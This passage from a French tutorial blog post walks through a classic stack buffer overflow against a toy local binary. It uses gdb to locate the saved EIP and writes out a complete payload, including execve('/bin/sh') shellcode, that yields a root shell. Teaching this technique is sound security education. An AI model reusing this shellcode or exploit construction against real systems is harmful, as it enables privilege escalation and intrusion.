Nous voyons que le programme a tenté d'accéder à l'adresse mémoire 0x08004141. Donc les deux derniers caractères de notre chaine dépassent sur la sauvegarde de EIP. Il y a donc deux caractères en trop, ce qui fait bien 20 octets avant d'écraser EIP (sans compter le caractère null). Il faut donc pour notre payload :

  * 20 caractères (quels qu'ils soient)
  * L'adresse qui suit l'adresse à laquelle est sauvegardée EIP
  * (Le pool de NOP, mais nous allons faire sans)
  * Le shellcode

<p style="text-align: center;">
  <img class="alignnone size-full wp-image-474 " src="http://i1.wp.com/blog.hackndo.com/assets/uploads/2015/03/img_54f78d2d9a419.png?w=640" alt="Organisation de la pile pour le shellcode après EIP sans NOP" data-recalc-dims="1" />
</p>

<p style="text-align: left;">
  Pour connaitre l'adresse de la sauvegarde de EIP (et donc l'adresse qui suit), faisons un breakpoint juste après que EIP est poussé sur la pile, c'est à dire à la première instruction de <em>func</em> et regardons la valeur de ESP.
</p>

<pre class="lang:shell">(gdb) break *0x080483f4
Breakpoint 1 at 0x80483f4
(gdb) run `perl -e 'print "A"x69'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /tmp/hackndo/binary A

Breakpoint 1, 0x080483f4 in func ()
(gdb) i r $esp
esp            0xbffffc4c    0xbffffc4c
(gdb) x/4xw $esp
0xbffffc4c:    0x08048446    0xbffffe81    0xb7ff1380    0x0804846b
(gdb)</pre>

<p style="text-align: left;">
  <div class='info2'>
    Pourquoi lancer <em>run</em> avec 69 &#8216;A', plutôt que de lancer <em>run</em> sans argument ?
  </div>
</p>

<p style="text-align: left;">
  Il est important de se poser cette question. En effet, nous sommes en train de chercher une adresse précise d'une variable sur la pile. Il est important de passer 69 &#8216;A' en argument car c'est la longueur totale de notre payload que nous enverrons pour exploiter le buffer overflow (20 octets contenant le buffer et EBP + 4 octets pour l'écrasement de EIP + 45 octets de shellcode).  Or, avant la pile se trouvent les variables d'environnement et les arguments du programme (dont son nom).
</p>

<img class=" size-full wp-image-484 aligncenter" src="http://i1.wp.com/blog.hackndo.com/assets/uploads/2015/03/img_54f81318e37b8.png?w=640" alt="Décalae de la pile" data-recalc-dims="1" />

Donc si on modifie la taille des arguments passés au programme, ça décalera la pile, donc les adresses que l'on recherche. C'est pourquoi il est indispensable de rester dans le même contexte d'exécution, en envoyant un argument qui soit toujours de la même taille, que ce soit pendant nos recherches ou pendant notre exploitation.

<p style="text-align: left;">
  Cela étant dit, revenons au résultat de notre breakpoint : ESP a pour valeur 0xbffffc4c, et on vérifie bien qu'à cette adresse se trouve 0x08048446, qui est la valeur sauvegardée de EIP (puisque c'est l'adresse de l'instruction qui suit le call de <em>func</em>). Il va donc falloir faire pointer cette sauvegarde de EIP vers l'adresse suivante, qui contiendra notre shellcode, c'est à dire l'adresse 0xbffffc50.
</p>

<p style="text-align: left;">
  Nous avons donc notre payload, qui est de la forme :
</p>

<p style="text-align: left;">
  perl -e &#8216;print &#8220;A&#8221;x20 . &#8220;\x50\xfc\xff\xbf&#8221; . &#8220;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh&#8221;&#8216;
</p>

<p style="text-align: left;">
  Donc dans gdb, quand on envoie :
</p>

<pre class="lang:shell">(gdb) run `perl -e 'print "A"x20 . "\x50\xfc\xff\xbf" . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'`

Starting program: /tmp/hackndo/binary `perl -e 'print "A"x20 . "\x50\xfc\xff\xbf" . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'`
AAAAAAAAAAAAAAAAAAAAP����^�1�F�F
                                �
                                 ���V
                                      ̀1ۉ�@̀�����/bin/sh
process 21429 is executing new program: /bin/dash
$ whoami
root
$</pre>

<p style="text-align: center;">
  <strong>I AM (G)ROOT !</strong>
</p>

J'espère que cet article **tuto buffer overflow** vous aura été utile. Des protections contre ce type d'exploitation existent cependant, comme le fait de rendre la pile non exécutable. À ce moment là, pas de panique, vous pouvez toujours récupérer un shell, avec par exemple la technique du [retour à la libc](http://blog.hackndo.com/retour-a-la-libc/) (ret2libc). Have fun !

N'hésitez pas à commenter et partager si vous avez aimé !